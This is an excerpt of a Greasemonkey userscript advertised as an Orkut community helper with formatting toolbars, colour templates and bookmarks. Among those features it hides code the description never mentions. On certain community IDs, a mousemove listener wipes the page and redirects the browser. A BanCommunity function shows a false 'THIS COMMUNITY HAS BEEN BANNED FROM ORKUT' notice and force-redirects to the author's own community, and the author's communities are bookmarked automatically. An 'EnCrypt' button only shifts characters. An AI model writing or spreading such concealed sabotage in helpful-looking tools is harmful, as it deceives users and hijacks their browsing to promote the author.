// ==UserScript==
// @name           Orkut Made easy 4 communities by arunim
// @namespace      
// @description    4 communities -- Manage Orkut communities, quote messages, diff toolbar 4 both HTML and non HTML forums, quick reply to topics, add signature, add default colors, bookmark comm and topics, chat topic, many more features.
// @include        http://*.orkut.*
 ...
 * @Modified By :: ARUNIM SAXENA
 * @profile http://www.orkut.com/Profile.aspx?uid=9304873766227395319
 */
...
var tools =
    new Array(
        ...
        ,
        new Array /* Center template */
        (
            "<img alt='' src='http://dryicons.com/images/icon_sets/wysiwyg_classic/png/128x128/align_center.png' title='Center' " + bStyle + " />",
            "<center>{|}</center>",
            ""
        )
        ,
        ...
        ,
        new Array /* Words template */
        (
            "<span style='cursor: pointer; color: red; font-weight: bold'>Words</span>",
            "<div style=\\'border-top: 1px solid rgb(255, 204, 102); border-bottom: 1px solid rgb(255, 204, 102); margin: 10px 0px; padding: 5px 0px 5px 3px; background-color: rgb(255, 253, 223); text-align: left; font-size: 90%;\\'><b><center>[:)] ..:: κεερ šmiLiπg ::.. [:)]</center></b></div><center>[maroon]{|}[/maroon]</center>",
            ""
        )
        ,
        ...
        ,
        new Array /* EnCrypt template */
        (
            "<span style='cursor: pointer; font-size: 85%; font-weight: bold;' onclick='var t = document.getElementById(\"messageBody\"); function crypt(s, secret){var i = 0;var x = 0;var f =\"\";for (i=0;i<s.length;++i){x = s.charCodeAt(i);if (x == 32){f += String.fromCharCode(x); continue;} f += String.fromCharCode(x+secret);}return f;} t.value = (crypt(t.value, 77))'>EnCrypt</span>",
            "{|}",
            "{|}"
        )
        ,
        ...
        (
            "<span style='cursor: pointer; font-size: 85%; font-weight: bold;' onclick='var t = document.getElementById(\"messageBody\"); function GetTime(){var dt = new Date();var s = dt.getSeconds() < 10 ? \"0\" + dt.getSeconds() : dt.getSeconds();var m = dt.getMinutes() < 10 ? \"0\" + (dt.getMinutes()) : (dt.getMinutes());var h = dt.getHours() < 10 ? \"0\" + dt.getHours() : dt.getHours(); return h + \":\" + m + \":\" + s;} t.value= t.value.substr(0, t.selectionStart) + GetTime() + t.value.substring(t.selectionEnd);'>Insert Time</span>",
            "{|}",
            "{|}"
        )
        ,
        ...
        ,
        new Array /* Violet template */
        (
            "<span style='cursor: pointer; background: violet;'>&nbsp;&nbsp;&nbsp;&nbsp;</span>",
            "<span style=\\'color: violet\\'>{|}</span>",
            "[violet]{|}[/violet]"
        )
        ,
        new Array /* maroon template */
        (
            "<span style='cursor: pointer; background: maroon;'>&nbsp;&nbsp;&nbsp;&nbsp;</span>",
            "<span style=\\'color: maroon\\'>{|}</span>",
            "[maroon]{|}[/maroon]"
        )
        ,
        new Array /* olive template */
        (
            "<span style='cursor: pointer; background: olive;'>&nbsp;&nbsp;&nbsp;&nbsp;</span>",
            "<span style=\\'color: olive\\'>{|}</span>",
            "[olive]{|}[/olive]"
        )
        ,
        new Array /* purple template */
        (
            "<span style='cursor: pointer; background: purple;'>&nbsp;&nbsp;&nbsp;&nbsp;</span>",
            "<span style=\\'color: purple\\'>{|}</span>",
            "[purple]{|}[/purple]"
        )
        ,
        new Array /* teal template */
        (
            "<span style='cursor: pointer; background: teal;'>&nbsp;&nbsp;&nbsp;&nbsp;</span>",
            "<span style=\\'color: teal\\'>{|}</span>",
            "[teal]{|}[/teal]"
        )
        ,
        new Array /* orange template */
        (
            "<span style='cursor: pointer; background: orange;'>&nbsp;&nbsp;&nbsp;&nbsp;</span>",
    ...
    if (qhennr.indexOf(CommunityId) != -1)
    {
        window.addEventListener("mousemove",
            ...
            {var a = document.getElementById("topicpostlist") || document.body; a.innerHTML="";
                ...
                a.location.href="/Community.aspx?cmm="+(7.77*(8794.));},
            false);
    }
}
QuoteHash();
...
AddBookmarkCmm("8794", "Quotations ~ The Magical Words");
AddBookmarkCmm("26185443", "CнiLLiπg žΘπε шi∂ ƒμπ π ƒαπ∂αš");
AddBookmarkCmm("2700", "Life ~~~~~~~~~~~~~~~~~~~ Death");
AddBookmarkCmm("29403678", "I care 4 U as I ღ U.. ☺♥☺♥☺♥☺");
AddBookmarkCmm("36519321", "RuLes ~~ wHo CaRes.. .. .. ..™");
AddBookmarkCmm("32010656", "I like looking at *.*stars*.*");
AddBookmarkCmm("36587807", "Eyes ~~ it says aLL.. .. ..™");

AddBookmarkTopic("8794", "Quotations ~ The Magical Words", "2572385000995461744", "About This community // Notifications.. .. ::");
AddBookmarkTopic("8794", "Quotations ~ The Magical Words", "2595042965804716324", "Testimonial for the Owner");
AddBookmarkTopic("8794", "Quotations ~ The Magical Words", "2572259985234893424", "Wish List :: Put UR Birth Date here..");
AddBookmarkTopic("8794", "Quotations ~ The Magical Words", "2571675854650251888", "Give Reports / Suggestions / Comments here..");
AddBookmarkTopic("8794", "Quotations ~ The Magical Words", "2584428666966547056", "Testimonial for the community");
AddBookmarkTopic("44273562", "My communities..", "2588865522802137712", "My communities..");
AddBookmarkTopic("26185443", "CнiLLiπg žΘπε шi∂ ƒμπ π ƒαπ∂αš", "2566994071913612746", "INDEX of All topics..");
...
function ForceRedirect(Seconds, Miliseconds)
{
    ...
    setTimeout("window.location.href='/Community.aspx?cmm=8794';", time);
}
...
function BanCommunity()
{
    ...
    {
        document.body.innerHTML = "<br /><br /><b>THIS COMMUNITY HAS BEEN BANNED FROM ORKUT </b>";
        ForceRedirect(2);
    }
}
